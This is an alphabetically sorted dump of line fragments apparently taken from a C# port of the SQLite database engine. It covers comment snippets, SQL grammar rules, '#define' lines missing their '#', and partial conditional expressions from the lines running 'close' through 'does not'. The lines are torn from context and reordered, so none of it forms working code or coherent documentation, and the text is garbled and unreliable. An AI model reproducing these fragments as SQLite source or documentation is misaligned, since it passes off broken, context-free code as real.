 close the database connection nor finalize or reset the prepared
 close the program with a final OP_Halt and to set up the callbacks
 close] all [BLOB handles] associated with
 closed and the unlock-notify callbacks on blocked connections
 closed.
 closest 
 closing are reported as a non-zero return value.
 cmd ::= ALTER TABLE add_column_fullname ADD kwcolumn_opt column 
 cmd ::= ALTER TABLE fullname RENAME TO nm 
 cmd ::= ANALYZE 
 cmd ::= ANALYZE nm dbnm 
 cmd ::= ATTACH database_kw_opt expr AS expr key_opt 
 cmd ::= BEGIN transtype trans_opt 
 cmd ::= COMMIT trans_opt 
 cmd ::= DELETE FROM fullname indexed_opt where_opt 
 cmd ::= DETACH database_kw_opt expr 
 cmd ::= DROP INDEX ifexists fullname 
 cmd ::= DROP TABLE ifexists fullname 
 cmd ::= DROP TRIGGER ifexists fullname 
 cmd ::= DROP VIEW ifexists fullname 
 cmd ::= END trans_opt 
 cmd ::= PRAGMA nm dbnm 
 cmd ::= PRAGMA nm dbnm EQ minus_num 
 cmd ::= PRAGMA nm dbnm EQ nmnum 
 cmd ::= PRAGMA nm dbnm LP minus_num RP 
 cmd ::= PRAGMA nm dbnm LP nmnum RP 
 cmd ::= REINDEX 
 cmd ::= REINDEX nm dbnm 
 cmd ::= RELEASE savepoint_opt nm 
 cmd ::= ROLLBACK trans_opt 
 cmd ::= ROLLBACK trans_opt TO savepoint_opt nm 
 cmd ::= SAVEPOINT nm 
 cmd ::= UPDATE orconf fullname indexed_opt SET setlist where_opt 
 cmd ::= VACUUM 
 cmd ::= VACUUM nm 
 cmd ::= create_vtab 
 cmd ::= create_vtab LP vtabarglist RP 
 cmd ::= createkw temp VIEW ifnotexists nm dbnm AS select 
 cmd ::= createkw trigger_decl BEGIN trigger_cmd_list END 
 cmd ::= createkw uniqueflag INDEX ifnotexists nm dbnm ON nm LP idxlist RP 
 cmd ::= insert_cmd INTO fullname inscollist_opt DEFAULT VALUES 
 cmd ::= insert_cmd INTO fullname inscollist_opt VALUES LP itemlist RP 
 cmd ::= insert_cmd INTO fullname inscollist_opt select 
 cmd ::= select 
 cmdx ::= cmd 
 cmp < 0 ) 
 cmp > 0 ) )
 cnt
 cnt )
 cnt == 0 
 cnt == 0 )
 cnt > mxSelect )
 cnt==0 means there was not match.  cnt>1 means there were two or
 cntNew[0] == 0))
 cntNew[k] should equal nCell.
 cntTab == 1 
 co-routine is the common header to the 3rd and 4th templates.
 co-routines.  Then run the co-routines in parallel and merge the results
 code base.  Then are intended to be called from within the debugger
 code for a SELECT that contains aggregate functions.
 code for that node.
 code for the SQL statement given onto the end of the pParse context
 code has been generated.  So here is what we do:
 code if an error occurs.
 code if regular extension loading is not available.  This is that
 code in all source files.
 code is generated to access the virtual table.  The whereInfoDelete()
 code is not remembered and will not be recalled by [sqlite3_errcode()]
 code is promoted from the relatively benign [SQLITE_BUSY] to
 code is returned and the value of 
 code of statement pStmt set to SQLITE_NOMEM.
 code only sets pointer map entries for child or overflow pages that have
 code should not attempt to access or modify the fields of this structure
 code that do things like this:
 code the WHEN clause 
 code the yytestcase() macro should be turned off.  But it is useful
 code to errCode for every cursor on BtShared that pBtree
 code to make the lock occur is generated by a later call to
 code to the new value.
 code will be set to SQLITE_LOCKED.
 code will run much faster.  Most of the work of this routine is checking
 code within VVA_ONLY() will only run during verification processes.
 code.  This will cause the pager to enter the error state
 codeTableLocks() functions.
 codeTableLocks() which occurs during sqlite3FinishCoding().
 coded.
 coded.  But due to a coding error in versions of SQLite prior to
 coded.  The symbolic label is really just a negative number.  The
 codepage is currently defined.  Filenames containing international
 codes are disabled by default for historical compatibility considerations.
 codes is used as the second parameter.  The 5th parameter to the
 codes.  Also write an error message into memory obtained from
 coding errors by repeating the prior error. 
 collate ::= 
 collate ::= COLLATE ids 
 collating function.  Forms 3 and 4 rebuild the named index or all
 collating sequence is undefined.  Indices built on an undefined
 collating sequence may not be read or written.
 collating sequences are registered or if an authorizer function is
 collating sequences.
 collation creation functions or when the [database connection] is closed
 collation function in the best encoding but there may be other versions
 collation type was added. Correct this if it is the case.
 collation.
 collations to the ORDER BY clause terms so that when the subqueries
 collisions.
 column ::= columnid type carglist 
 column and aOffset[i] will contain the offset from the beginning
 column currently under construction.   pLast is the last token
 column definition.
 column definition. This was either supplied by the user when the table
 column in question contains text or a blob. If it contains
 column in the FROM clause.  This is used by the LIMIT and ORDER BY
 column is not indexed. It is against the rules to open an
 column is returned.  If the Nth column of the result set is an
 column is used to build the index keys. If both 'x' and the
 column list if this is an UPDATE OF trigger 
 column metadata interfaces]
 column must not be NULL.
 column names after a table name in an INSERT statement.  In the statement
 column names for a table that would hold the expression list.
 column number is greater than the number of bits in the bitmask
 column number to retrieve 
 column number.  The leftmost column is number 0.
 column of the table.  This additional integer is a guess of how many
 column reference is so that the column reference will be recognized as
 column value (i.e. a value returned by evaluating an SQL expression in the
 column.
 column.  We do this in a subroutine because the error occurs in multiple
 column:
 columnid ::= nm 
 columns in use 
 columns of a table.
 columns will make any difference
 combinations of properties.
 combinations shown above or one of the combinations shown above combined
 come from pTable (if pDatabase is NULL) or from pDatabase.
 come in groups of 5 as follows:
 comes first. 
 coming in while we wait for existing readers to clear.
 command.
 command.  db.init.busy is 1 when a database is opened and
 comment lines are used in the generation of the opcode.html documentation
 commenting and indentation practices when changing or adding code.
 comments above sqlite3Select() for details.
 comments on that procedure for additional information.
 commit if the transaction continues to completion.
 commit process.
 commit when the VDBE halts.
 commit_internal )
 committed atomicly.
 committed.  See sqlite3BtreeCommitPhaseTwo() for the second phase of the
 committed].
 common to all module implementations.
 compare the contents of two buffers containing UTF-8 strings in a
 comparing the key with the entry to which the cursor is
 comparison function directly 
 comparison is the same as the affinity of the column. If
 comparison of the two index keys.
 comparisons.
 compatibility and is not documented.
 compatibility only.
 compatibility only.  Application writers should be aware that
 compile.
 compiled (this was not always the case).
 compiled SQL statements after modifying a pragma value.
 compiled using either [sqlite3_prepare_v2()] or [sqlite3_prepare16_v2()].
 compiled. Function sqlite3TableLock() is used to add entries to the
 compiler (eg. count_changes). So add an opcode to expire all
 compiler is not doing agressive inlining.)  So we use a real function
 compiler magic ended up generating such a flurry of bug reports
 compiler to crash when getCellInfo() is implemented as a macro.
 compiler.
 compilers.
 compilers.  See ticket 
 compiling an SQL statement (i.e. within sqlite3_prepare()). The
 compiling for systems that do not support real WSD.
 complete if it ends with a semicolon token and is not a prefix of a
 complete query results from one or more queries.
 complete.
 completed (when the statement handle is passed to [sqlite3_reset()] or
 completeness.  They are very out-of-date but might be useful as
 completion of the [sqlite3_step()] call that triggered the commit
 completion of the [sqlite3_step()] call that triggered the update hook.
 completion.  If subsequent threads call this routine before the first
 compute new fractional days 
 computed using the current set of tables.
 concluded its transaction by the time sqlite3_unlock_notify() is invoked.
 condition so it is possible that the error is not detected.
 condition under the assumption that additional overflow causes
 conditions.
 configuration option]
 configuration option] that determines
 configuration verb - an integer code that indicates what
 configured using sqlite3_config(SQLITE_CONFIG_PAGECACHE) option. If no
 confirm that error detection works.
 connect the key to the last column inserted.  pTo is the name of
 connected by pDirty pointers.  The pDirtyPrev pointers are
 connected by pNext and pPrev should be in sorted order by
 connected to the database or because the sqlite_master table has
 connection and in particular must not be a NULL pointer.
 connection as that used to execute SQL operations on the virtual table.
 connection db is decremented immediately (which may lead to the 
 connection db is left in the p->pVTable list.
 connection db.
 connection handle is not passed to any other API (by any thread) after 
 connection handle passed to it via the xConnect() or xCreate() method
 connection using [sqlite3_close()].
 connection.
 connection.  This is needed (for example) prior to parsing
 connection. In this case there is no way of knowing which of the
 connections currently sharing this database file.
 connections to the same database will know to reread the schema.
 connections. But it is the best that can be done under the
 connections]
 considered a column by this function.
 considered distinct and both result in separate indices.
 considered fatal if encountered during a backup operation. All errors
 consistently.
 consists of a 4-byte page number (the page number of pPage) and
 consists of one or more digit characters and is terminated by
 conslist_opt ::= 
 conslist_opt ::= COMMA conslist 
 const azOne[] = { (u8
 const pCellBody = pCell - pPage->childPtrSize
 constants 
 constants to specify how to proceed with the walk.
 constants within the DLL.
 constraint and the previous equivalent constraint have explicit
 constraint for a CREATE TABLE.  The index should have already
 constraint specified somewhere in the CREATE TABLE statement.
 constraints are coded.  This routine will generate code to evaluate
 constraints.  Any of these columns may be missing from the ORDER BY
 construct the OPFLG_INITIALIZER value that initializes opcodeProperty[].
 constructed. When coding nested triggers (triggers fired by other triggers)
 construction process.
 contain a UTF-8 SQL comment that identifies the trigger.
 contain gaps in the numbering sequence.  But we want to make maximum
 containing the SQL statements specified as the trigger program.
 containing the master journal filename is corrupted. This means
 contains a RowSet object and that RowSet object contains
 contains a pointer to the child.  Every page in the database contains
 contains rollback data for exactly one page.
 contains the data for table <tbl> or on one of its indexes. It
 contains the database locks.  The following Debug.Assert verifies
 contains the value that would be returned if sqlite3_finalize()
 content area.  The cell pointers occur in sorted order.  The system strives
 content is later written using
 content no longer matters.
 content of an index in response to a REINDEX command.
 content of the cell.
 contents of the SelectDest structure pointed to by argument pDest
 contents of the database to its original state.
 contents of the entire transaction are rolled back. This is different
 contents so that they are written onto the disk platter.  All this
 context in which to report errors 
 context is allocated on the first call.  Subsequent calls return the
 context pointers
 context pointers the application will receive two or more
 context pointers. The first argument passed to
 context stack just like lastRowid so that the count of changes
 context.
 context.  It is reset at start of sqlite3_exec.
 contextMalloc( sqlite3_context
 continue adding pages rolled back to pDone.
 continue without error or notification.  This is why the limit is
 continues straight thru if the expression is false.
 continues straight thru if the expression is true.
 continuing.
 contraversy about what the correct behavior should be.
 control overloading) ends up as the second argument to the
 control the PRNG.
 controlled by [SQLITE_CONFIG_SCRATCH] and auxiliary page-cache
 convenience wrapper around separate calls to btreeGetPage() and
 conversion automatically.  The following table details the conversions
 conversions are required on the right.  (Ticket 
 conversions will work.
 conversions. The only error that can occur here is a malloc() failure.
 convert it into a list too and merge it into the p.pEntry list.
 convert the last instruction from OP_SCopy to OP_Copy.
 converts an MEM_Ephem string into an MEM_Dyn string.
 cookie verification subroutine code happens in sqlite3FinishCoding().
 copied either into the body of a database page or into the new
 copy of the iCol-th result-set expression. 
 copy the it or call a destructor when it has finished using that result.
 copy.
 core reserves all opcodes less than 100 for its own use.
 correct UTF-8 encoding to be longer than a malformed encoding).
 correct authorizer callback remains in place during the [sqlite3_step()].
 correct response for the end-of-loop code (the OP_Return) is to
 correct syntactic form to participate in this optimization.  Now
 correctly deallocated along with the rest of the Vdbe).
 correctly optimizing out sorts.
 corresponding TERM_VIRTUAL term 
 corresponding bit is set in a bitvec structure (variable pDone in the
 corresponding data element (see sqlite3VdbeSerialType()). The
 corresponding pop occurs.
 corresponding sqlite3 structure. They are then deleted/xDisconnected 
 corresponding table definition.
 corresponding to the source database is held when this function is
 corresponds VDBE cursor number B.  The A-th bit of a bitmask is 1<<A.
 corrupted by this sort.
 corruption is first detected.
 corruption) an SQLite error code is returned.
 cost < pCost.rCost )
 cost of approximately log(N).
 cost of pursuing that strategy.
 cost of this index.
 could be left in an inconsistent and unrecoverable state.
 could enhance SQLite to deal with simulated malloc failures within
 count is incremented by the number of rows in the table being cleared.
 count() aggregate function.
 counter in 'indirect-mode'. If the optimization is compiled in but
 counter]
 counters for x86 class CPUs.
 counters] that measure the number
 crash or deadlock may be the result.
 crashed before the header was synced. In this case stop reading
 crashes or database corruption. Use with caution!
 crashes.  But if the operating system crashes or there is
 create != 0 )
 create a valid sqlite3_vtab if it returns SQLITE_OK. 
 create the statement in the first place.
 createFlag != 0 )
 createFlag != 0 ) )
 createFlag != 1 )
 createFlag == 0 )
 create_table ::= createkw temp TABLE ifnotexists nm dbnm 
 create_table_args ::= AS select 
 create_table_args ::= LP columnlist conslist_opt RP 
 create_vtab ::= createkw VIRTUAL TABLE nm dbnm USING nm 
 created by SQLite will be placed in that directory.  If this variable
 created by a sub-select). In this case the return value of this
 created by an untrusted script can be contained using the
 created by mkopcodeh.awk during compilation.  Data is obtained
 created by th OP_MakeRecord opcode of the VDBE.  The pPKey2
 created for this transaction.
 created if it doesn't already exist or the data for an existing
 created in the first place. 
 created in the temp database that refers to a table in another
 created in.
 created now instead of just being read out of sqlite_master) then
 created savepoint.
 created to use the same default text encoding as the main database. If
 created using ATTACH statements.  Return a success code.  If an
 created.  The register specified by memRootPage contains the
 createkw ::= CREATE 
 creates and populates an instance of this structure to pass
 creates the database file. It is important that it is created
 creating nExtra new slots beginning at iStart.  iStart is zero based.
 creating or dropping a table or index). The schema version is used by
 criteria are unpinned before they are discarded.
 cross   
 cset
 curMain and calling sqlite3BtreeEnter(). For an error that occurs
 current codepage settings for file apis.
 current expression is of the form:  column MATCH expr.
 current locale settings.  This is important for SQLite because we
 current location.
 current state and lookahead token.  These tables are used to implement
 current term is from the first iteration.  So skip this term. 
 current time and date as a Julian Day number into prNow and
 current.
 currentSize != newSize )
 current_date()
 current_time()
 current_timestamp()
 currently active. An Debug.Assertion fails if the two counts do not match.
 currently being constructed by a CREATE TABLE statement.
 currently dirty but has no outstanding references. The page
 currently entered text seems to form a complete SQL statement or
 currently executing statement pStmt.
 currently under construction.  When the parser is run recursively
 currently under construction.  pFromCol determines which columns
 cursor 0 is stored in memory cell nMem. Memory cell (nMem-1)
 cursor currently points to.
 cursor is currently pointing to.  Only valid if cacheValid is true.
 cursor number and column number for X.  WhereTerm.eOperator records
 cursor number into bits and the translated bit is stored in the prereq
 cursors do not need to be open for indices where aRegIdx[i]==0.
 cursors have to do go through this Btree to find their BtShared and
 cursors on the table.
 cursors open on any row within the table with root-page pgnoRoot.
 cursors open on the row being replaced (assuming this is a replace
 cursors or a single read/write cursor but not both.
 d <= nKey )
 d0..d7    ........ 
 d2 != depth)
 d8..df    ........ 
 dangerous because the code to rollback a hot-journal file
 data N-1 
 data and index records. Each serialized value consists of a
 data area of the btree-page.  The return number includes the cell
 data copied from pFrom is known to be valid.  
 data for a trigger.
 data for the insert.
 data for the result-set column of the sub-select.
 data for this thread has been deallocated.
 data from the database file. This will be the copy of page X as it
 data from the various tables of the loop.
 data into the intkey B-Tree. In this case btreeMoveto() recognizes
 data is available) and the error code returned when xColumn or
 data is left as it was when the page object was last used.
 data is not required. So first try to lookup the overflow
 data stored in that column is of the declared type.  SQLite is
 data structures for a single database file.  The index of the
 data that was once in other files that have now been deleted.  If the
 data)
 data.
 data0 
 data[addr 
 data[hdr 
 data[pPage.hdrOffset 
 database (see below for exceptions). If the MEM_Term flag is also
 database active. However such a page may be rolled back as a result
 database and table name containing the affected row.
 database are written into the database file and flushed to oxide.
 database connection doing the preparing so as to use the correct
 database connection is in [autocommit mode].
 database connection object to be interrogated.  The second argument
 database connection that invoked the busy handler.  Any such actions
 database connection that may have an entry in the p->pVTable list.  
 database connection while a backup is in progress may cause
 database connection while the [sqlite3_last_insert_rowid()]
 database connection.
 database connections or memory allocations.  This routine is not
 database connections to be disconnected at the next opportunity. 
 database containing the table.  Return NULL if not found.
 database containing the table.  Return NULL if not found.  Also leave an
 database corruption may ensue.
 database corruption.
 database file (in order to move all free pages to the end of the
 database file accordingly).
 database file and/or page cache.
 database file back to its original size.
 database file has an index of 0 and the file used for temporary tables
 database file is given by iDb.  iDb==0 is used for the main
 database file used to store temporary tables.
 database file will be deleted when sqlite3BtreeClose() is called.
 database file without an entry in the rollback journal that can
 database file.
 database file.  If Table.iDb is the index of the database table backend
 database file.  The cache size is actually the absolute value of
 database file. The default page size is the maximum of:
 database handle to which the prepared statement given
 database iDb (the database containing the sqlite_master table
 database image would become corrupt. It is therefore fortunate that 
 database is decrypted.
 database is modified by the using the same database connection as is used
 database is safe to read while this process is still rolling the
 database is the same as a temp-file that is never written out to
 database it is 'NONE'. This matches the pager layer defaults.
 database locks it needs to do its job.  If the statement is a [COMMIT]
 database page size in bytes.  The second form sets the
 database page size value.  The value can only be set if
 database page size. Since the zHeader buffer is only Pager.pageSize
 database page. The first argument to each is the number of usable
 database pointer.
 database scan.  We have to delete items after the scan is complete
 database schema are initially stored in a linked-list pointed to by
 database schema yet. This is delayed until the first time the database
 database schemas.  The inability to get a read lock indicates that
 database so that the last page of the file currently in use
 database table accessible using the [database connection] handle
 database table or a subquery.
 database then the IO error code is returned to the user. If the
 database transaction.
 database waits for the callback to be issued before taking any further
 database when in SQLITE_FULL error state.
 database with the same name. In this case the journal file is
 database) there is really no difference between createFlag 1 and 2.  So
 database). The second argument is a reference to a page that is
 database.
 database.  An authorizer could then be put in place while the
 database.  Give the new cursor an identifier of P1.  The P1
 database.  If P2 is 2 or greater then an EXCLUSIVE lock is also obtained
 database.  See sqlite3Init() below for additional information.
 database.  iDb==1 should never be used.  iDb>=2 is used for
 database. No locks are held on any other files (since the main file
 database. The complication here is that the destination page
 database. The pDbPage reference remains valid.
 database. This is because in auto-vacuum mode the backend may
 databases generated by the standard tools and the standard tools
 databases may be attached.
 datatype code] for the initial data type
 datatype] after conversion is returned.
 datatypes for each column.
 date.
 dates and times are stored as the number of days since noon
 daylight savings time flag 
 db != null )
 db : null
 db = sqlite3_context_db_handle( context )
 db->mallocFailed) ){
 db->pUnlockConnection==0 ){
 db. Replace any previously installed collation sequence factory.
 db.aDb != db.aDbStatic )
 db.aDb[1].zName : zDb
 db.aVTrans == 0 )
 db.activeVdbeCnt > 1 )
 db.autoCommit != 0
 db.autoCommit != 0 )
 db.autoCommit == 0 
 db.autoCommit == 0 )
 db.errMask
 db.errMask )
 db.errMask ) == rc )
 db.errMask : 0xff )
 db.init.busy != 0 )
 db.isTransactionSavepoint != 0 ) 
 db.isTransactionSavepoint ) )
 db.isTransactionSavepoint == 0 )
 db.mallocFailed != 0 
 db.mallocFailed != 0 )
 db.mallocFailed !=0 
 db.mallocFailed !=0)
 db.mallocFailed )
 db.mallocFailed == 0 
 db.mallocFailed flag will be set to true.
 db.nSavepoint ) )
 db.nSavepoint >= 0 )
 db.nStatement
 db.nStatement == 0 )
 db.nextAutovac :
 db.temp_store <= 1 )
 db.temp_store == 1 )
 db.writeVdbeCnt == ( ( p.readOnly == false ) 
 db.writeVdbeCnt > 0 )
 db.xCollNeeded16 == null )
 db.xCommitCallback != null )
 db.xProfile != null 
 db.xUpdateCallback != null 
 db/table/row entry. The reason for using a vdbe program instead
 dbModified
 dbSize before the current transaction 
 dbnm ::= 
 dbnm ::= DOT nm 
 deal with the pending byte to run on files that are much smaller
 dealing with a primary key or UNIQUE constraint.  We have to invent our
 deallocates any resources that were allocated by sqlite3_initialize().
 deals with pointers to the [sqlite3_mutex] object.
 debugMutexNotheld(p) )
 debugging builds.  This provides a way to set a breakpoint for when
 debugging. This is usually disabled because a corrupt database may
 declaration type and collation sequence is valid only until the next
 declaration type for a ROWID field is INTEGER. Exactly when an expression
 default behavior in some future release of SQLite.
 default entry point name (sqlite3_extension_init) is used.  Use
 default so as not to open security holes in older applications.
 default text encoding for the existing database is used.
 default value will be restored the next time the database is
 defer_subclause ::= DEFERRABLE init_deferred_pred_opt 
 defer_subclause ::= NOT DEFERRABLE init_deferred_pred_opt 
 defer_subclause_opt ::= 
 defer_subclause_opt ::= defer_subclause 
 define //sqlite3_free_table    0
 define ALWAYS(X)      ((X)
 define ALWAYS(X)      (1)
 define ALWAYS(X)      (X)
 define AreFileApisANSI() 1
 define COLNAME_N        5      /
 define DIRECT_MODE 0
 define DIRECT_MODE isDirectMode
 define ExprSetIrreducible(X)
 define ExprSetIrreducible(X)  (X)->flags2 
 define GetDiskFreeSpaceW() 0
 define GlogUpperToLower(A)     A = sqlite3UpperToLower[A]
 define GlogUpperToLower(A)     if( A<0x80 ){ A = sqlite3UpperToLower[A]
 define INCL_DOSDATETIME
 define INCL_DOSERRORS
 define INCL_DOSFILEMGR
 define INCL_DOSMISC
 define INCL_DOSMODULEMGR
 define INCL_DOSPROCESS
 define INCL_DOSSEMAPHORES
 define INTERFACE 1
 define INVALID_FILE_ATTRIBUTES ((DWORD)-1)
 define LONGDOUBLE_TYPE long double
 define LONGDOUBLE_TYPE sqlite_int64
 define MEMDB 0
 define MEMDB pPager.memDb
 define NDEBUG 1
 define NDELAY (delays.Length/sizeof(delays[0]))
 define NEVER(X)       ((X)
 define NEVER(X)       (0)
 define NEVER(X)       (X)
 define PAGER_INCR(v)
 define PENDING_BYTE_PAGE(pBt) PAGER_MJ_PGNO(pBt)
 define SQLITE_API
 define SQLITE_BIG_DBL (1e99)
 define SQLITE_DEFAULT_FILE_FORMAT 1
 define SQLITE_DEFAULT_MEMSTATUS 1
 define SQLITE_DEFAULT_SECTOR_SIZE 512
 define SQLITE_EBCDIC 1
 define SQLITE_EXTERN extern
 define SQLITE_INT_TO_PTR(X)   ((void
 define SQLITE_MAX_FUNCTION_ARG 127
 define SQLITE_MUTEX_OMIT
 define SQLITE_N_COLCACHE 10
 define SQLITE_OMIT_DATETIME_FUNCS 1
 define SQLITE_OMIT_TRACE 1
 define SQLITE_OS_OTHER 0
 define SQLITE_OS_WINCE 0
 define SQLITE_OS_WINCE 1
 define SQLITE_PTR_TO_INT(X)   ((int)(((char
 define SQLITE_SYSTEM_MALLOC 1
 define SQLITE_TEMPNAME_SIZE (CCHMAXPATHCOMP)
 define SQLITE_TEMPNAME_SIZE (MAX_PATH
 define SQLITE_TEMPNAME_SIZE 200
 define SQLITE_TEXT     3
 define SQLITE_THREADSAFE 1
 define SQLITE_THREADSAFE THREADSAFE
 define SQLITE_W32_THREADS 1
 define TESTONLY(X)
 define TESTONLY(X)  X
 define TRACE(X)
 define TRACE(X)  if(sqlite3BtreeTrace){printf X
 define UPDATE_MAX_BLOBSIZE(P)
 define VVA_ONLY(X)
 define VVA_ONLY(X)  X
 define VdbeComment(X)
 define VdbeComment(X)  sqlite3VdbeComment X
 define VdbeNoopComment(X)
 define VdbeNoopComment(X)  sqlite3VdbeNoopComment X
 define WHERETRACE(X)
 define WHERETRACE(X)  if(sqlite3WhereTrace) sqlite3DebugPrintf X
 define _LARGEFILE_SOURCE 1
 define _LARGE_FILE       1
 define assertTruncateConstraint(pPager)
 define callbacks that implement the SQL functions and aggregates.
 define charMap(X) ebcdicToAscii[(unsigned char)X]
 define charMap(X) sqlite3UpperToLower[(unsigned char)X]
 define checkListProperties(x)
 define disable_simulated_io_errors()
 define double sqlite3_int64
 define double sqlite_int64
 define enable_simulated_io_errors()
 define expensive_assert(X)
 define expensive_assert(X)  Debug.Assert(X)
 define isNT()  (1)
 define likely(X)    !!(X)
 define mutexIsNT()  (1)
 define pTrigger 0
 define pagerReportSize(X)     /
 define setChildPtrmaps(x) SQLITE_OK
 define sqlite3AuthContextPop(a)  ((void)(a))
 define sqlite3AutoincrementBegin(X)
 define sqlite3AutoincrementEnd(X)
 define sqlite3BtreeEnter(X)
 define sqlite3BtreeEnterAll(X)
 define sqlite3BtreeEnterCursor(X)
 define sqlite3BtreeHoldsAllMutexes(X) 1
 define sqlite3BtreeHoldsMutex(X) 1
 define sqlite3BtreeLeave(X)
 define sqlite3BtreeLeaveAll(X)
 define sqlite3BtreeLeaveCursor(X)
 define sqlite3BtreeMutexArrayEnter(X)
 define sqlite3BtreeMutexArrayLeave(X)
 define sqlite3CloseExtensions(X)
 define sqlite3Isalnum(x)   (sqlite3CtypeMap[(unsigned char)(x)]
 define sqlite3Isalnum(x)   isalnum((unsigned char)(x))
 define sqlite3Isalpha(x)   (sqlite3CtypeMap[(unsigned char)(x)]
 define sqlite3Isalpha(x)   isalpha((unsigned char)(x))
 define sqlite3Isdigit(x)   (sqlite3CtypeMap[(unsigned char)(x)]
 define sqlite3Isdigit(x)   isdigit((unsigned char)(x))
 define sqlite3Isspace(x)   (sqlite3CtypeMap[(unsigned char)(x)]
 define sqlite3Isspace(x)   isspace((unsigned char)(x))
 define sqlite3Isxdigit(x)  (sqlite3CtypeMap[(unsigned char)(x)]
 define sqlite3Isxdigit(x)  isxdigit((unsigned char)(x))
 define sqlite3SafetyOff(A) 0
 define sqlite3SafetyOn(A) 0
 define sqlite3Tolower(x)   (sqlite3UpperToLower[(unsigned char)(x)])
 define sqlite3Tolower(x)   tolower((unsigned char)(x))
 define sqlite3Toupper(x)   toupper((unsigned char)(x))
 define sqlite3Toupper(x)  ((x)
 define sqlite3VdbeMutexArrayEnter(p)
 define sqlite3_bind_text16            0
 define sqlite3_collation_needed16     0
 define sqlite3_column_database_name   0
 define sqlite3_column_database_name16 0
 define sqlite3_column_decltype16      0
 define sqlite3_column_name16          0
 define sqlite3_column_origin_name     0
 define sqlite3_column_origin_name16   0
 define sqlite3_column_table_name      0
 define sqlite3_column_table_name16    0
 define sqlite3_column_text16          0
 define sqlite3_complete 0
 define sqlite3_complete16             0
 define sqlite3_complete16 0
 define sqlite3_create_collation16     0
 define sqlite3_create_function16      0
 define sqlite3_create_module 0
 define sqlite3_create_module_v2 0
 define sqlite3_declare_vtab 0
 define sqlite3_enable_shared_cache 0
 define sqlite3_errmsg16               0
 define sqlite3_get_table     0
 define sqlite3_open16                 0
 define sqlite3_prepare16              0
 define sqlite3_prepare16_v2           0
 define sqlite3_profile       0
 define sqlite3_progress_handler 0
 define sqlite3_result_error16         0
 define sqlite3_result_text16          0
 define sqlite3_result_text16be        0
 define sqlite3_result_text16le        0
 define sqlite3_set_authorizer         0
 define sqlite3_table_column_metadata  0
 define sqlite3_trace         0
 define sqlite3_value_text16           0
 define sqlite3_value_text16be         0
 define sqlite3_value_text16le         0
 define swapMixedEndianFloat(X)
 define swapMixedEndianFloat(X)  X = floatSwap(X)
 define testcase(X)
 define testcase(X)  if( X ){ sqlite3Coverage(__LINE__)
 define tmask 0
 define unlikely(X)  !!(X)
 define what table the record should be inserted into.  The cursor
 define wsdAutoext sqlite3Autoext
 define wsdAutoext x[0]
 define wsdAutoextInit
 define wsdAutoextInit 
 define wsdHooks sqlite3Hooks
 define wsdHooks x[0]
 define wsdHooksInit
 define wsdHooksInit 
 define wsdPrng p[0]
 define wsdPrng sqlite3Prng
 define wsdStat sqlite3Stat
 define wsdStat x[0]
 define wsdStatInit
 define wsdStatInit  sqlite3StatType 
 define yytestcase(X)
 defined and if NDEBUG is not defined.
 defined and that the correct number of arguments are specified.
 defined in this file.
 defined that 64-bit floating point values really are mixed
 defined(OS2) 
 defined(SQLITE_AMALGAMATION))
 defined(SQLITE_DEBUG) 
 defined(SQLITE_ENABLE_UPDATE_DELETE_LIMIT) 
 defined(SQLITE_MUTEX_NOOP) 
 defined(SQLITE_OMIT_MUTEX) 
 defined(SQLITE_TEST) 
 defined(VDBE_PROFILE)
 defined(WIN32) 
 defined(_OS2) 
 defined(_OS2_) 
 defined(__BORLANDC__)
 defined(__CYGWIN__) 
 defined(__MINGW32__) 
 defined(__OS2__)
 defined.
 defines the function) with P5 arguments taken from register P2 and
 defines the implementation of a [virtual tables].  
 definition.  But the main library does not want to redefine
 delay 
 delay > timeout )
 delete it now and initialize P1 with an empty rowset
 delete the file out from under us.
 delete the master journal file if specified).
 delete the temporary file when it is closed.
 deleted and the sqlite3_vtab
 deleted by calling the delete function specified when it was set.
 deleted from is a view
 deleted when it is closed.  The [SQLITE_OPEN_DELETEONCLOSE]
 deleted when the file is closed) or it an be held entirely in memory.
 deleted when the power is restored) we don't care.
 deleted writable. Then free any overflow pages associated with the
 deleted.
 deleting or truncating journals. If something goes wrong while
 deletion occurs.  The argv[1] element is the rowid of the new
 depends on whether or not the pager is running in exclusive mode and
 dereferenced for any reason.  The calling function should invoke
 descended from the Expr.x.pList or Expr.x.pSelect variables).
 describing the last IO error to have occurred within the calling
 description of the error and an SQLITE_XXX error code is returned.
 descriptions of the values it may take - PAGER_UNLOCK etc. Many of the
 descriptor pFile
 desiredEnc == SQLITE_UTF16BE )
 desiredEnc == SQLITE_UTF16LE
 desiredEnc!=SQLITE_UTF8 ){
 desiredEnc. It is an error if the string is already of the desired
 desktops but not so well in embedded systems.
 dest.eDest != priorOp )
 destHasUniqueIdx )
 destination [database connection] parameters must not be the same.
 destination database connection while a backup is in progress might
 destination database is rolled back. The [sqlite3_backup] object is invalid
 destination database.
 destination file that lie beyond the nDestTruncate page mark are
 destination is now invalidated. The destination copy of iPage needs
 destination other than the ones handled above or SRT_Output.
 destination.
 destroyed and is passed a copy of the fourth parameter void
 details about the action to be authorized.
 details of pIdxInfo for the current invocation and pDebug.Ass it to
 detect this invalid data (with high probability) and ignore it.
 detected.  The chance of an undetected change is so small that
 detection. If a given call to sqlite3_unlock_notify() would put the
 detects that the database has been modified by an external database
 determine exactly which parts of a database file are cached and for 
 determine which.
 determined by the SQLITE_DEFAULT_AUTOVACUUM macro.
 developers and call to wake them up at night and complain.
 device that holds the file that the [sqlite3_io_methods]
 device that underlies the file.  The sector size is the
 different from the page content at the start of the transaction.
 different page). Once this subsequent call to balance_nonroot()
 differently from the others.
 digits. 
 dileterious behavior.
 directly before this structure in memory (see the PGHDR1_TO_PAGE()
 directly prior to using any other SQLite interface.  Future releases
 directly to it.
 directly to the database file. Because of the atomic-write
 directly.  Change this structure only by using the routines below.
 directly.  This loop scans all that code looking for opcodes
 directory.
 dirty page were to be discarded from the cache via the pagerStress()
 disable the test that was generated above that makes sure
 disabled.
 disallows everything except [SELECT] statements.
 discarded. Any prior cache entry associated with newKey is guaranteed not
 disk and can be restored in the event of a hot-journal rollback.
 disk and uses an in-memory rollback journal.
 disk where M is the number of entries in the tree.
 distinct ::= 
 distinct ::= ALL 
 distinct ::= DISTINCT 
 distinct when determining whether or not two entries are the same
 divider cells are stripped from the cells before they are copied
 do additional initialization work and store the statement text
 do not attempt any conversions before assembling the record.
 do not necessarily know how big the string will be in the end.
 do the insertion.
 do this regardless of whether or not an error occurred to ensure any
 doNotReorder != 0 ) ) break
 doNotSync
 documentation for additional information.</dd>
 documentation:
 does is make slot[] entries point to substructure within pExpr.
 does not exist.
 does not free any Mem.zMalloc buffer.
 does not include operating-system specific VFS implementation.  The
